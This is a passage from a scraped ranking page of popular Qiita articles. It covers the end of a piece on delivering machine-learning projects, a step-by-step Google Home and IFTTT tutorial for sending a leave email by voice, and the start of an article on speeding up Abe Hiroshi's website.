<span id="大変な未来が見えてきた" class="fragment"></span><a href="#%E5%A4%A7%E5%A4%89%E3%81%AA%E6%9C%AA%E6%9D%A5%E3%81%8C%E8%A6%8B%E3%81%88%E3%81%A6%E3%81%8D%E3%81%9F"><i class="fa fa-link"></i></a>大変な未来が見えてきた</h2>

<p>そうなると実運用していくためには、<strong>毎日情報を自動的に収集</strong>して、<strong>予測値を計算</strong>して、<strong>その結果を報告</strong>出来るような仕組みを作らないといけません。<br>
これってオフラインで解析していたときとは全く異なるスキルで、<strong>Webによるシステム自動化</strong>の知識が必須になってきます。<br>
スキルセットとしては、以下のようなものがあります。</p>

<ul>
<li>サーバーでの環境構築（LinuxやDocker等）</li>
<li>データベース（MySQL）</li>
<li>Webアプリケーション（Ruby on Rails, HTML, CSS, JavaScriptなど）</li>
<li>Web API（Python）</li>
<li>Cron（定期実行）</li>
<li>Webサーバー（NginxやApache）</li>
</ul>

<p>こんなにリッチに作る必要はなかったりしますが、とは言え、このぐらいのスキルセットがないと、最終的な自動的に運用しながら報告できる仕組みづくりを行うことはできません。</p>

<p>たとえば、私が納品しているようなケースだと解析を終えた後に、仮の検証を行うための仕組みとして以下のような構成を作っています（各サーバーが1Dockerコンテナ）。</p>

<p><a href="https://camo.qiitausercontent.com/f7f9c8825b0480fce54be916428b449a36d1be5a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133303138312f35376363633933612d366432362d313235652d323738392d3737366261383631396333612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/f7f9c8825b0480fce54be916428b449a36d1be5a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133303138312f35376363633933612d366432362d313235652d323738392d3737366261383631396333612e706e67" alt="システム構成.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/130181/57ccc93a-6d26-125e-2789-776ba8619c3a.png"></a></p>

<p>こうなると、全く今までの予算では足りなく、確保していた時間に関しても全然足りないわけです。</p>

<p>とは言え、依頼側からすると、実運用しながら検証してもらえないと納得して支払いができないため、やっぱりこのあたりは必要になってくるケースが多いかと思います。</p>

<h1>
<span id="総括" class="fragment"></span><a href="#%E7%B7%8F%E6%8B%AC"><i class="fa fa-link"></i></a>総括</h1>

<p>機械学習案件を依頼された時は、納品物を明確にしておきましょう。<br>
相手方の不安に寄り添いながら進めていく必要があるため、ちゃんと長い目でみて運用できるような仕組みを考えて、その分の予算を確保しておくようにしましょう。</p>

<p>「検証とは、検証データに対する結果をみることではなく、仮運用をはじめた後に得られる結果を見ることである」</p>

<p>そのため、お客様と考えていくべき納品フローはこのようになります。</p>

<p><a href="https://camo.qiitausercontent.com/64327e297e500a50bd6a528953f20312a7ee0a5f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133303138312f65633939333838312d376161302d346535302d373365382d6665353330646462636639332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/64327e297e500a50bd6a528953f20312a7ee0a5f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133303138312f65633939333838312d376161302d346535302d373365382d6665353330646462636639332e706e67" alt="after.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/130181/ec993881-7aa0-4e50-73e8-fe530ddbcf93.png"></a></p>

<p>仮運用には、Webアプリケーション等のViewも必要になるケースがありますので、ご注意ください（簡単なのはSlackボット）。</p>

<p>それでは、今回は私の猛省も兼ねた振り返りでした。</p>

<p>ひとりでも多くの方が、幸せな機械学習案件に携われますように。</p>

<h1>
<span id="著者紹介" class="fragment"></span><a href="#%E8%91%97%E8%80%85%E7%B4%B9%E4%BB%8B"><i class="fa fa-link"></i></a>著者紹介</h1>

<p>株式会社キカガク<br>
代表取締役社長　吉崎 亮介（twitter: <a href="https://twitter.com/yoshizaki_kkgk" rel="nofollow noopener" target="_blank">@yoshizaki_kkgk</a>）</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">8位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>610</kbd>
		<a target="_blank" href="https://qiita.com/diescake/items/4f354a5dc7cb738efd4f">布団から腕すら出さずに会社を休む [Google Home]</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-30<br />03:34:02</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/38837.html">diescake</a>(14件の記事)<br />(ACCESS CO., LTD 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/38837/profile-images/1498821682">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[gmail]</b> <b>[ifttt]</b> <b>[joke]</b> <b>[GoogleHome]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="時は遡ること1年前" class="fragment"></span><a href="#%E6%99%82%E3%81%AF%E9%81%A1%E3%82%8B%E3%81%93%E3%81%A81%E5%B9%B4%E5%89%8D"><i class="fa fa-link"></i></a>時は遡ること1年前…</h1>

<p>以前、こんな記事を書きました。</p>

<p><a href="https://camo.qiitausercontent.com/efbc0406dc75ac419ff5397abf2c7dd8aff9d144/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f63636435313663372d333836642d376632372d316237362d6636383163666139316164342e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/efbc0406dc75ac419ff5397abf2c7dd8aff9d144/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f63636435313663372d333836642d376632372d316237362d6636383163666139316164342e6a706567" width="450px" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/ccd516c7-386d-7f27-1b76-f681cfa91ad4.jpeg"></a><br>
<a href="https://qiita.com/diescake/items/d4e1fb2dccc2fd4c92d8" id="reference-be4ce317fbd3123835d4">会社が休みになるボタンを作ってみた [Amazon Dash Button]</a></p>

<p>しかし、この Amazon Dash Button をハックした方式では以下の問題点がありました。</p>

<ul>
<li><strong>同ネットワーク内にサーバを立てておく必要がある</strong></li>
<li><strong>ハック的な使い方をしているため、動作不安定</strong></li>
<li>目を開ける必要がある</li>
<li>ボタンを押す動作すら面倒くさい</li>
<li>ノールックでボタンを押そうとするとボタン(半休/全休)を間違える</li>
</ul>

<p>そのくらい我慢しろや！という項目もありますが、<br>
やはり運用していく上で一番面倒だったのは、自サーバをローカルに立てておく必要がある点でした。</p>

<p>ネットワークに流れる ARP パケットをイベントのトリガーにする仕組みなので、<br>
サーバをクラウドへ持っていくことができなかったのです。<br>
(あくまで、一般向けの Amazon Dash Button をハックして利用している場合の話)</p>

<p>というわけで、結局すぐに使わなくなってしまったのでした…</p>

<h1>
<span id="時は満ちた" class="fragment"></span><a href="#%E6%99%82%E3%81%AF%E6%BA%80%E3%81%A1%E3%81%9F"><i class="fa fa-link"></i></a>時は満ちた。</h1>

<p>さて、<strong>Google Home</strong> が発売されました。</p>

<p>キャズム前方へ陣取る皆様側は、既に手に入れている方も多いものと思いますが、<br>
今回 Google Home を利用することで、上述した問題点をほぼ解決し、<br>
比較的安定して運用できているためご紹介します。オススメです！</p>

<p>先に断っておくと、<strong>コードは1行も書いていません。</strong><br>
IFTTT 連携の設定をするだけで実現できてしまいました。</p>

<p>(前回見たくコードを書く気満々でいたので不完全燃焼感が・・・)</p>

<h1>
<span id="会社を布団から腕すら出さずに休むボタンとは" class="fragment"></span><a href="#%E4%BC%9A%E7%A4%BE%E3%82%92%E5%B8%83%E5%9B%A3%E3%81%8B%E3%82%89%E8%85%95%E3%81%99%E3%82%89%E5%87%BA%E3%81%95%E3%81%9A%E3%81%AB%E4%BC%91%E3%82%80%E3%83%9C%E3%82%BF%E3%83%B3%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>会社を布団から腕すら出さずに休むボタンとは？</h1>

<h2>
<span id="ユースケース" class="fragment"></span><a href="#%E3%83%A6%E3%83%BC%E3%82%B9%E3%82%B1%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>ユースケース</h2>

<p>俺「ねぇ、Google、午前半休したい」<br>
Home「イエス、ユアハイネス」</p>

<p>➔ 会社に勤怠メールが送られる！！＼(^o^)／</p>

<h2>
<span id="というわけでデモ動画" class="fragment"></span><a href="#%E3%81%A8%E3%81%84%E3%81%86%E3%82%8F%E3%81%91%E3%81%A7%E3%83%87%E3%83%A2%E5%8B%95%E7%94%BB"><i class="fa fa-link"></i></a>というわけで、デモ動画</h2>

<p>相変わらず地味…</p>

<blockquote class="twitter-tweet">
<p>布団から腕すら出さずに会社を休む [Google Home]<a href="https://t.co/YOeaA0UQqT" rel="nofollow noopener" target="_blank">https://t.co/YOeaA0UQqT</a> <a href="https://t.co/8KmSklEf5D" rel="nofollow noopener" target="_blank">pic.twitter.com/8KmSklEf5D</a></p>— diescake (@pomeranian_dev) <a href="https://twitter.com/pomeranian_dev/status/924722132923252736?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">2017年10月29日</a>
</blockquote>



<h2>
<span id="仕組み" class="fragment"></span><a href="#%E4%BB%95%E7%B5%84%E3%81%BF"><i class="fa fa-link"></i></a>仕組み</h2>

<p>Google Home と <strong>IFTTT(If This Then That)</strong> の連携で実現します。</p>

<p>IFTTT の詳細については他記事へ譲りますが、<br>
一言でいえば、何かをトリガー(This)に、何かのイベント(That)を発生させる、というルール(レシピ)を設定できるウェブサービスです。</p>

<p>IFTTT の凄いところは、この <strong>This</strong> と <strong>That</strong> に設定可能なウェブサービスが広く網羅されているため、<br>
これらを組み合わせるだけで、多岐にわたるユーザの要求を実現したり、<br>
アイデア次第ではキラーな機能を <strong>コードを書かずに</strong> 実現できることです。</p>

<h2>
<span id="ifttt-でレシピをつくる" class="fragment"></span><a href="#ifttt-%E3%81%A7%E3%83%AC%E3%82%B7%E3%83%94%E3%82%92%E3%81%A4%E3%81%8F%E3%82%8B"><i class="fa fa-link"></i></a>IFTTT でレシピをつくる</h2>

<p>というわけで、レシピの作成手順です。<br>
今回は下記レシピを作ります。</p>

<ul>
<li>
<strong>This</strong>: Google Assistant</li>
<li>
<strong>Then</strong>: Gmail</li>
</ul>

<h3>
<span id="作成手順" class="fragment"></span><a href="#%E4%BD%9C%E6%88%90%E6%89%8B%E9%A0%86"><i class="fa fa-link"></i></a>作成手順</h3>

<p>IFTTT や Google アカウントは別途ご用意ください。<br>
途中、Gmail へのアクセス許可が求められる場合があります。</p>

<p>また、以下は PC 版ベースの手順となりますが、iOS/Android アプリでも同様に設定が可能です。</p>

<p><a href="https://camo.qiitausercontent.com/7319668ae7232ed9085f0fd74d6d7ec8a907dc07/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f37386564393637302d393030632d346534342d636633392d6231366135323535626365622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7319668ae7232ed9085f0fd74d6d7ec8a907dc07/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f37386564393637302d393030632d346534342d636633392d6231366135323535626365622e706e67" alt="01.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/78ed9670-900c-4e44-cf39-b16a5255bceb.png"></a></p>

<p>My Applets 画面から New Applet を選択<br>
ちなみに、スクショにはテレビのチャンネルを制御するレシピ(NatureRemo)が見えてますねｗ</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/d5d535679abe9c7d6e893cf9474dea144e89eaaa/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f34653564333739612d363735622d386638362d356264312d3665653936353938623165352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d5d535679abe9c7d6e893cf9474dea144e89eaaa/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f34653564333739612d363735622d386638362d356264312d3665653936353938623165352e706e67" alt="02.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/4e5d379a-675b-8f86-5bd1-6ee96598b1e5.png"></a></p>

<p>まずは this から設定していきます。</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/ce9de60036624819400892240319cfc77057b1d0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f31353435663034322d643436302d303365342d316130392d6566303531353035353566632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/ce9de60036624819400892240319cfc77057b1d0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f31353435663034322d643436302d303365342d316130392d6566303531353035353566632e706e67" alt="03.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/1545f042-d460-03e4-1a09-ef05150555fc.png"></a></p>

<p>Google Assistant を探して選択。</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/e7a3741270011440e12bb2644587fc2e2ea05659/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f34356635623838642d653838322d616566632d396366652d3635616231343537363162622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e7a3741270011440e12bb2644587fc2e2ea05659/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f34356635623838642d653838322d616566632d396366652d3635616231343537363162622e706e67" alt="04.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/45f5b88d-e882-aefc-9cfe-65ab145761bb.png"></a></p>

<p>ここでは "Say a simple phrase" を選択。<br>
もし、Google Home に命令するフレーズの中に変数や数値を持たせたければ、内容に応じて他の項目を選択します。</p>

<p>例えば、"体調不良"とか"私用"といった休暇理由を言葉で指定したければ、<br>
"Say a phrase with a text ingredient" を選択することで実現できます。</p>

<p>実際のフレーズとしては、「ねぇ、Google、今日は○○で午前休したい」のようなイメージです。<br>
ちなみに、<strong>変数をフレーズの冒頭に使えない</strong>ので、"今日は"を挟んでいます。</p>

<p>日本語だと、目的語が前にくるためいまいちな点ではあります。</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/626f3c4ddbb555de6b89b0258c79759d3b8ffaac/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f61356164323639342d646634352d383932632d353062382d6433373538643930363562642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/626f3c4ddbb555de6b89b0258c79759d3b8ffaac/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f61356164323639342d646634352d383932632d353062382d6433373538643930363562642e706e67" alt="05.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/a5ad2694-df45-892c-50b8-d3758d9065bd.png"></a></p>

<p>まず、Google Home が認識するフレーズを指定していきます。</p>

<p>3フレーズまで指定が可能で、<br>
ここでは、"午前半休したい" or "午前休したい" or "午前休" のいずれかのフレーズに反応するように指定しています。</p>

<p>ここでいくつか注意点があります。</p>

<p>まず、<strong>フレーズは一字一句完全にマッチしないと認識しない</strong>という点です。</p>

<p>この場合だと、"午前半休" や "午前半休をしたい" といったフレーズには反応しないので注意が必要。<br>
一番最初に頭に浮かんだフレーズをそのまま登録するのがオススメです。</p>

<p>加えて <strong>Google Home が漢字の読み方を誤る</strong>場合があります。<br>
その結果、正しく伝えたつもりでも Google Home の解釈するフレーズとマッチせず、反応しないという場合もあるので、<br>
怪しい場合はひらがなで入力したほうが良いかもしれません。</p>

<p>2点目、<strong>予約済みのフレーズ(意味)があり、衝突すると IFTTT で指定した動作が呼び出されません。</strong></p>

<p>具体的には、IFTTT で "照明をつけて" というフレーズを設定しておいても、<br>
Google のスマートホーム関連に処理を奪われ、IFTTT で指定した処理には繋がりません。</p>

<p>こういう場合は思いっきりフレーズを変えるか、<br>
"照明をスタート" といったちょっと怪しい日本語を探すのが良さそうです。</p>

<p>続いて、Google Home の応答メッセージを指定します。<br>
ここでは "イエス ユア ハイネス"と指定しています。</p>

<p>フレーズに変数を用意した場合は、<br>
変数が正しく伝わっているか確認する意味で、レスポンスに含めるのが良いでしょう。</p>

<p>最後に、言語は Japanese を指定します。<br>
これは忘れないよう注意です。</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/e61660404c0536a6a2b1644924cb58d090235cdd/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f38353835666565302d336434632d316238362d626464302d6436366532316639613864382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e61660404c0536a6a2b1644924cb58d090235cdd/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f38353835666565302d336434632d316238362d626464302d6436366532316639613864382e706e67" alt="06.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/8585fee0-3d4c-1b86-bdd0-d66e21f9a8d8.png"></a></p>

<p>this の設定が終わったため that を設定していきます。</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/84ba1e20e5d15f961e9209667b68358772ab358b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f38626366633364342d363431352d366334392d653737352d3038333062666139633561302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/84ba1e20e5d15f961e9209667b68358772ab358b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f38626366633364342d363431352d366334392d653737352d3038333062666139633561302e706e67" alt="07.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/8bcfc3d4-6415-6c49-e775-0830bfa9c5a0.png"></a></p>

<p>Gmail を選択します。</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/2267ea3dabdb3fbc85c2761609cc532cae1a970c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f34376534393536322d313038312d623537342d633365612d3535626366666265613638662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2267ea3dabdb3fbc85c2761609cc532cae1a970c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f34376534393536322d313038312d623537342d633365612d3535626366666265613638662e706e67" alt="08.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/47e49562-1081-b574-c3ea-55bcffbea68f.png"></a></p>

<p>"Send an email" を選択。<br>
その他には、自身へメールを送る機能や、下書きを追加する機能があります。</p>

<p>下書き追加は、簡単なメモを残したい時に良いかも。</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/61acba8f6b83943c7cd7351b5b1f8693e3831cb8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f36303636613336332d613761622d616264302d613632352d3932316463393664623963612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/61acba8f6b83943c7cd7351b5b1f8693e3831cb8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f36303636613336332d613761622d616264302d613632352d3932316463393664623963612e706e67" alt="09.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/6066a363-a7ab-abd0-a625-921dc96db9ca.png"></a></p>

<p><strong><font color="red">【追記】<br>
Body に改行を含む場合は &lt;pre&gt;&lt;/pre&gt; で文章全体を括ってください！</font></strong><br>
<strong>括らないと改行が半角スペースに変換されてしまうようです。</strong><br>
<strong>上図の場合でいえば Body 欄は、下記のように入力する必要があります。</strong><br>
<strong>&lt;pre&gt;</strong><br>
<strong>みなさま</strong></p>

<p><strong>お疲れ様です。diescake です。</strong><br>
<strong>(略)</strong><br>
<strong>よろしくお願いいたします。</strong><br>
<strong>&lt;/pre&gt;</strong></p>

<p>メールの内容詳細を設定していきます。<br>
項目通りにそのまま入力していけば特に問題はないと思います。</p>

<p>メールは <strong>IFTTT に連携している Gmail アカウント</strong> から送られます。<br>
Google Home と連携している Gmail アカウントと分けることできる点は捗りますね。</p>

<p>また、Google Assistant の設定で、フレーズに変数や数値を含める方式を選択していた場合は、<br>
"Add Ingredient" のボタンで読み出すことができます。</p>

<p>例えば、休暇理由をフレーズ内に含めるようにしていた場合は、<br>
Body の欄で "Add Ingredient" を選択し、"体調不良"のキーワードを変数に置き換えることで実現が可能です。</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/483fc6f5ff57749ab49780854fdbe98111c90654/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f39326432643639302d653532312d616637382d383462342d6639646133353265396633642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/483fc6f5ff57749ab49780854fdbe98111c90654/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f39326432643639302d653532312d616637382d383462342d6639646133353265396633642e706e67" alt="10.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/92d2d690-e521-af78-84b4-f9da352e9f3d.png"></a></p>

<p>最後にレシピ自体の名前を設定します。<br>
この名前はなんでも構いませんが、下部の notification のスイッチは切っておくのがおすすめです。</p>

<p>スイッチが有効になっていると、本レシピが実行された際に都度メールで通知されるようになります。<br>
今回のユースケースでは不要でしょう。</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/7855754a85d90e3f165ca95546d680a7ea0d6c5e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f61613035326134302d613530372d663362662d303131622d3237373339616563336134382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7855754a85d90e3f165ca95546d680a7ea0d6c5e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f61613035326134302d613530372d663362662d303131622d3237373339616563336134382e706e67" alt="11.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/aa052a40-a507-f3bf-011b-27739aec3a48.png"></a></p>

<p>できました！<br>
一時的にこのレシピを無効化したい場合は、このスイッチで disable に切り替えることができます。</p>

<hr>

<p><a href="https://camo.qiitausercontent.com/c59c036a1601dbe52ba183fd06586632e5b4c6b3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f63366661323266312d613466372d393837632d323765392d3361636662333563313334302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c59c036a1601dbe52ba183fd06586632e5b4c6b3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383833372f63366661323266312d613466372d393837632d323765392d3361636662333563313334302e706e67" alt="12.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38837/c6fa22f1-a4f7-987c-27e9-3acfb35c1340.png"></a></p>

<p>一覧にも追加されていますね！</p>

<p>この記事を見ると、長々と作業が必要なように思えますが、<br>
実際やってみると非常に単純で5分もかからないと思います。</p>

<h1>
<span id="感想とか" class="fragment"></span><a href="#%E6%84%9F%E6%83%B3%E3%81%A8%E3%81%8B"><i class="fa fa-link"></i></a>感想とか</h1>

<p><strong>Google Home すごい。IFTTT すごい。</strong></p>

<p>私は色々なガジェットや新しいものにはすぐ飛びつく方で、Google Home も深く考えず手に入れましたが、<br>
思っていたより遥かに完成度が高く、ストレスなく、快適に使えて感動しました。</p>

<p>私は LINE Wave(Clova) も先行生産版を所持していますが、<br>
まだ、一部の新し物好き向けの製品という枠はでていないと感じました。</p>

<p>一方 Google Home は認識精度や応答速度などの基本的な性能が高いことに加えて、<br>
IFTTT との連携が非常に強力で、この勤怠メールの他にも、家電の制御(NatureRemo) や twitter 連携など、生活の中で自然に活用できています。<br>
あとは TODO 管理アプリの <strong>Trello</strong> も IFTTT 対応していて that へ指定できるようなので、これもレシピを作ったら便利そうかな。</p>

<p>今後、さらに基本機能が洗練されて、<br>
スキルのインストールといったエコシステムが構築されれば、<br>
機能追加のために、こういった一手間も不要になって一般家庭にも浸透していくだろう、と強く感じました。</p>

<p>国内向けの Alexa にも期待ですね（╹◡╹）</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">9位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>601</kbd>
		<a target="_blank" href="https://qiita.com/Morix1500/items/0eac072a027d478a6b83">阿部寛のサイトを高速化する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-18<br />00:11:02</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/152303.html">Morix1500</a>(11件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/152303/profile-images/1498094263">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[AWS]</b> <b>[S3]</b> <b>[CloudFront]</b> <b>[WebP]</b> <b>[阿部寛]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>ちまたで<a href="http://abehiroshi.la.coocan.jp/" rel="nofollow noopener" target="_blank">阿部寛のサイト</a>が早いと話題になってます。</p>

<p><a href="http://kuxumarin.hatenablog.com/entry/2017/11/15/dev.to%E3%81%A8%E9%98%BF%E9%83%A8%E5%AF%9B%E3%81%AE%E3%83%9B%E3%83%BC%E3%83%A0%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%A9%E3%81%A3%E3%81%A1%E3%81%8C%E9%80%9F%E3%81%84%E3%81%A7%E3%81%99%E3%81%8B%EF%BC%9F" rel="nofollow noopener" target="_blank">dev.toと阿部寛のホームページどっちが速いですか？</a><br>
<a href="https://qiita.com/naru0504/items/7d652681d698f6d88c4f" id="reference-e85331a7bde2a51a05e8">dev.toと阿部寛のホームページについてちゃんと計測させてくれ</a></p>

<p>阿部寛のサイトはベストを尽くしてるのか？<br>
それを調べるために、阿部寛のサイトを高速化させてみたいと思います。</p>

<h2>
<span id="目指すべきスピード" class="fragment"></span><a href="#%E7%9B%AE%E6%8C%87%E3%81%99%E3%81%B9%E3%81%8D%E3%82%B9%E3%83%94%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>目指すべきスピード</h2>

<p>最速はローカルのファイルへのアクセスだと思うのでこれを目指したいと思います。<br>
file:///C:/abe_hiroshi/index.html</p>

<p><a href="https://camo.qiitausercontent.com/d621b4b5abb24b6c6ec9ebcaa389b797dd6bd521/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f63656364313538632d663833662d303066322d633732652d3937303137663331653532392e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d621b4b5abb24b6c6ec9ebcaa389b797dd6bd521/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f63656364313538632d663833662d303066322d633732652d3937303137663331653532392e676966" alt="9baae75ad17a694cadc9a83081cd4df4.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/152303/cecd158c-f83f-00f2-c72e-97017f31e529.gif"></a></p>

<p>ChromeのDeveloper Toolでレンダリング完了が「173ms」でした。<br>
まぁここまでは無理だな…</p>

<h2>
<span id="阿部寛のサイトはどんなもん" class="fragment"></span><a href="#%E9%98%BF%E9%83%A8%E5%AF%9B%E3%81%AE%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AF%E3%81%A9%E3%82%93%E3%81%AA%E3%82%82%E3%82%93"><i class="fa fa-link"></i></a>阿部寛のサイトはどんなもん？</h2>

<p>速度は<a href="http://webpagetest.org" rel="nofollow noopener" target="_blank">webpagetest.org</a>で測ってみます。</p>

<p><a href="https://camo.qiitausercontent.com/0c67e0cf0ca7cb13054833fc67311917c19f8633/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f66343535623032632d363635332d663762302d313235652d3435326238353033623937342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/0c67e0cf0ca7cb13054833fc67311917c19f8633/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135323330332f66343535623032632d363635332d663762302d313235652d3435326238353033623937342e706e67" alt="nama.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/152303/f455b02c-6653-f7b0-125e-452b8503b974.png"></a><br>
レンダリング完了時間は「359ms」です。はえーな</p>

<h2>
